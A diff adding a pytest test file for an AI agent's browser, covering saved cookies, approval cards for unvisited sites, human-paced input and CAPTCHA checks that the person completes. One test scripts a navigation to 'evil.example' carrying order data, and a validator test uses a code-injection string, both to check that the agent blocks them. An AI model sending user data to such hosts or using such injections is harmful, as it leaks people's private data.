@@ -1,0 +1,243 @@
+# SPDX-License-Identifier: AGPL-3.0-or-later
+# Copyright (C) 2026 Axxlabs Limited
+# ruff: noqa: F811  (`setup` is test_signin's fixture)
+"""The browser remembers, looks like a person's, and lets the person do human checks (SPEC §3.4, §5.6; tests 13,
+20, 21). Uses the fake Playwright MCP of test_signin."""
+
+from __future__ import annotations
+
+import json
+import re
+
+import pytest
+
+from aha_local import approvals, checks
+from aha_local.tools import human, signins
+
+from .conftest import person, settle
+from .test_signin import PASSWORD, setup, start_sign_in  # noqa: F401
+
+
+def tool_results(llm) -> list[str]:
+    return [m["content"] for m in llm.requests[-1]["messages"] if m.get("role") == "tool"]
+
+
+async def test_any_site_is_remembered_between_tasks_and_contexts(setup, llm, chat, accounts):
+    agent, pool, fake = setup
+    fe = person(accounts)
+    llm.call("browser_navigate", url="https://www.shop.example/?visit=1")
+    llm.answer("Opened.")
+    await agent.inbound(fe, "open the shop")
+    await settle(agent)
+    # Saved after the task, encrypted: no sign-in needed for a site to be remembered.
+    assert signins.sites(fe) == [{"site": "shop.example", "signed_in": False}]
+    raw = (fe.dir / signins.FILE).read_bytes()
+    assert b"visitor" not in raw and b"shop.example" not in raw
+    first = fake.contexts[-1]
+    await pool.close(fe.id)  # idle: saved again, then closed
+    assert first.closed
+    await pool.for_account(fe.id).call("browser_tabs", {"action": "list"})
+    again = fake.contexts[-1]
+    assert [c["value"] for c in again.cookies] == ["v1"] and again.origins[0]["origin"] == "https://www.shop.example"
+
+
+async def test_a_state_that_failed_to_restore_is_never_saved_over(setup, accounts):
+    agent, pool, _ = setup
+    fe = person(accounts)
+    signins.save(
+        fe,
+        {**signins.empty(), "state": {"cookies": [{"name": "a", "value": "1", "domain": ".x.example"}], "origins": []}},
+    )
+
+    async def broken(account_id, session):
+        raise RuntimeError("the browser was restarting")
+
+    pool.on_open = broken
+    await pool.for_account(fe.id).call("browser_tabs", {"action": "list"})
+    assert pool.open_session(fe.id) is None
+    await agent.save_browser(fe)
+    await pool.close(fe.id)
+    assert signins.load(fe)["state"]["cookies"][0]["value"] == "1"  # still there
+
+
+async def test_expired_cookies_are_dropped_and_large_states_shrink(setup, accounts, monkeypatch):
+    _, pool, fake = setup
+    fe = person(accounts)
+    cookies = [
+        {"name": "old", "value": "x", "domain": ".a.example", "expires": 1000},
+        {"name": "live", "value": "y", "domain": ".a.example", "expires": -1},
+    ]
+    signins.save(fe, {**signins.empty(), "state": {"cookies": cookies, "origins": []}})
+    await pool.for_account(fe.id).call("browser_tabs", {"action": "list"})
+    ctx = fake.contexts[-1]
+    assert [c["name"] for c in ctx.cookies] == ["live"]
+
+    ctx.origins = [{"origin": "https://a.example", "localStorage": [], "indexedDB": [{"name": "big" * 50}]}]
+    monkeypatch.setattr(signins, "MAX_STATE", 300)
+    await signins.capture(fe, pool.open_session(fe.id))
+    state = signins.load(fe)["state"]
+    assert state["origins"] == [] and [c["name"] for c in state["cookies"]] == ["live"]
+    assert any(c == signins.GET_STATE_LIGHT for c in ctx.codes)  # tried without IndexedDB first
+
+
+async def test_old_kept_sign_ins_become_the_first_browser_state(accounts):
+    fe = person(accounts)
+    cookie = {"name": "sid", "value": "z", "domain": ".waitrose.com", "path": "/"}
+    fe.vault.write_json(fe.dir / signins.OLD_FILE, {"waitrose.com": {"site": "waitrose.com", "cookies": [cookie]}})
+    assert signins.sites(fe) == [{"site": "waitrose.com", "signed_in": True}]
+    assert not (fe.dir / signins.OLD_FILE).exists() and (fe.dir / signins.FILE).exists()
+    assert signins.load(fe)["state"]["cookies"] == [cookie]
+
+
+async def test_clear_browser_forgets_everything(setup, llm, chat, accounts):
+    agent, pool, fake = setup
+    fe, hb = person(accounts), accounts.create("Hb")
+    for who in (fe, hb):
+        llm.call("browser_navigate", url="https://www.shop.example/?visit=1")
+        llm.answer("Opened.")
+        await agent.inbound(who, "open the shop")
+        await settle(agent)
+    await agent.inbound(fe, "clear browser")
+    assert "forgotten every site" in chat.sent[-1].text
+    assert not (fe.dir / signins.FILE).exists() and not pool.is_open(fe.id)
+    assert signins.sites(hb) and pool.is_open(hb.id)  # another person's browser is untouched
+    await pool.for_account(fe.id).call("browser_tabs", {"action": "list"})
+    assert fake.contexts[-1].cookies == []
+
+
+async def test_after_a_signed_in_page_a_new_site_is_a_card(setup, llm, chat, accounts):
+    """SPEC §5.6: from then on in the task, a site not opened yet needs the person's approval."""
+    agent, _, _ = setup
+    fe = person(accounts)
+    card = await start_sign_in(agent, llm, chat, fe)
+    await agent.approval_reply(fe, card.card["id"], "approve", ["waitrose.com", "fe@example.com", PASSWORD])
+    await settle(agent)
+
+    chat.read = len(chat.sent)
+    llm.call("browser_navigate", url="https://www.waitrose.com/orders")  # signed in: its own pages stay auto
+    llm.call("browser_navigate", url="https://www.waitrose.com/basket")
+    llm.call("browser_navigate", url="https://evil.example/?orders=1234")
+    llm.answer("Done.")
+    await agent.inbound(fe, "what did I order last week?")
+    card = await chat.next()
+    assert card.card and card.card["title"] == "Open evil.example, a site not opened yet?"
+    await agent.approval_reply(fe, card.card["id"], "decline")
+    await settle(agent)
+    assert "declined" in tool_results(llm)[-1]
+
+    llm.call("browser_navigate", url="https://news.example/")  # a new task that never saw a signed-in page
+    llm.answer("Opened.")
+    await agent.inbound(fe, "open the news")
+    await settle(agent)
+    assert not any(m.card for m in chat.sent[chat.read :])
+
+
+async def test_typing_and_clicks_go_at_human_pace(setup, llm, chat, accounts):
+    agent, _, fake = setup
+    fe = person(accounts)
+    llm.call("browser_navigate", url="https://shop.example/")
+    llm.call("browser_click", element="Sign in", target="e4")
+    llm.call("browser_type", element="Email", target="[ref=e1]", text="fe@example.com")
+    llm.answer("Typed.")
+    await agent.inbound(fe, "type my email")
+    card = await chat.next()
+    await agent.approval_reply(fe, card.card["id"], "approve")
+    await settle(agent)
+    ctx = fake.contexts[-1]
+    assert ctx.moves[:1] == ["e4"] and ctx.calls.count("browser_click") == 1  # the mouse got there first
+    assert ctx.fields == {"e1": "fe@example.com"} and "browser_type" not in ctx.calls
+
+
+def test_only_element_references_go_into_harness_code():
+    assert human.is_ref("e12") and human.is_ref("f1e3")
+    for bad in ("e1'); evil('", "#id", "button", "", None, "e1 ", "aria-ref=e1"):
+        assert not human.is_ref(bad), bad
+        with pytest.raises(ValueError):
+            human.move_code(bad)  # type: ignore[arg-type]
+    code = human.type_code("e5", "a\"b'c`d${x}\n", True)
+    literal = re.search(r'JSON\.parse\(("(?:[^"\\]|\\.)*")\)', code).group(1)
+    assert json.loads(json.loads(literal)) == "a\"b'c`d${x}\n"  # text stays data
+    assert human.parse_taps("10,20;1279,812", 1280, 813) == [(10, 20), (1279, 812)]
+    for bad in ("1280,5", "5,813", "x,y", "1,2,3", ";".join(["1,1"] * 21)):
+        assert human.parse_taps(bad, 1280, 813) is None, bad
+    assert human.parse_taps("", 1280, 813) == []
+
+
+def test_a_check_cards_taps_are_checked_like_other_values():
+    fields = [approvals.Field("Site", "x.example", "info"), approvals.Field("Taps", "", "taps")]
+    assert approvals.checked_values(fields, ["x.example", "10,20;30,40"]) == ["x.example", "10,20;30,40"]
+    assert approvals.checked_values(fields, ["x.example", ""]) == ["x.example", ""]
+    assert approvals.checked_values(fields, ["x.example", "click the bus"]) is None
+    assert approvals.checked_values(fields, ["y.example", "1,1"]) is None  # info fields can't change
+
+
+async def test_the_person_does_the_check_by_tapping_the_screenshot(setup, llm, chat, accounts):
+    agent, _, fake = setup
+    fe = person(accounts)
+    llm.call("browser_navigate", url="https://tickets.example/queue")
+    llm.call("browser_human_check")
+    llm.answer("Through the check.")
+    await agent.inbound(fe, "get me in the ticket queue")
+    card = (await chat.next()).card
+    assert card["kind"] == "check" and card["title"] == "Show tickets.example you're human" and card["image"]
+    assert card["buttons"] == ["Send taps", "Give up"]
+    assert [(f["label"], f["kind"], f["editable"]) for f in card["fields"]] == [
+        ("Site", "info", False),
+        ("Taps", "taps", True),
+    ]
+    await agent.approval_reply(fe, card["id"], "approve", ["tickets.example", "1,1"])  # outside the 1×1 screenshot
+    card = (await chat.next()).card  # nothing clicked: a fresh card
+    assert fake.contexts[-1].taps == []
+    await agent.approval_reply(fe, card["id"], "approve", ["tickets.example", "0,0"])
+    card = (await chat.next()).card  # tapped, then a new screenshot
+    assert len(fake.contexts[-1].taps) == 1
+    await agent.approval_reply(fe, card["id"], "approve", ["tickets.example", ""])  # "It's done"
+    await settle(agent)
+    result = tool_results(llm)[-1]
+    assert "did the check" in result and "0,0" not in result
+    assert chat.texts()[-1] == "Through the check."
+
+
+async def test_giving_up_on_a_check_stops_it(setup, llm, chat, accounts):
+    agent, _, _ = setup
+    fe = person(accounts)
+    llm.call("browser_human_check")  # nothing open: refused
+    llm.call("browser_navigate", url="https://tickets.example/queue")
+    llm.call("browser_human_check")
+    llm.answer("Couldn't get past it.")
+    await agent.inbound(fe, "get me in the ticket queue")
+    card = (await chat.next()).card
+    await agent.approval_reply(fe, card["id"], "decline")
+    await settle(agent)
+    results = tool_results(llm)
+    assert "No page is open" in results[0] and "gave up on the check" in results[-1]
+
+
+def test_a_check_card_claimed_without_the_tool_is_caught():
+    for bad in (
+        "Please complete the captcha on the card I sent.",
+        "Tap the pictures with buses on the screenshot.",
+        "I've sent you a check card.",
+    ):
+        assert checks.unbacked_check_claim(bad, set()), bad
+        assert not checks.unbacked_check_claim(bad, {"browser_human_check"})
+    for fine in ("The site wants a check I can't do here: open it yourself.", "Booked for 7pm."):
+        assert not checks.unbacked_check_claim(fine, set()), fine
+
+
+async def test_an_approved_form_is_typed_in_its_own_order(setup, llm, chat, accounts):
+    agent, _, fake = setup
+    fe = person(accounts)
+    fields = [
+        {"element": "Email", "target": "e1", "type": "textbox", "value": "fe@example.com", "name": "Email"},
+        {"element": "Country", "target": "e9", "type": "combobox", "value": "Portugal", "name": "Country"},
+        {"element": "Code", "target": "e3", "type": "textbox", "value": "1000-001", "name": "Code"},
+    ]
+    llm.call("browser_navigate", url="https://shop.example/")
+    llm.call("browser_fill_form", fields=fields)
+    llm.answer("Filled.")
+    await agent.inbound(fe, "fill in the form")
+    card = await chat.next()
+    await agent.approval_reply(fe, card.card["id"], "approve")
+    await settle(agent)
+    assert fake.contexts[-1].order == ["typed e1", "filled e9", "typed e3"]
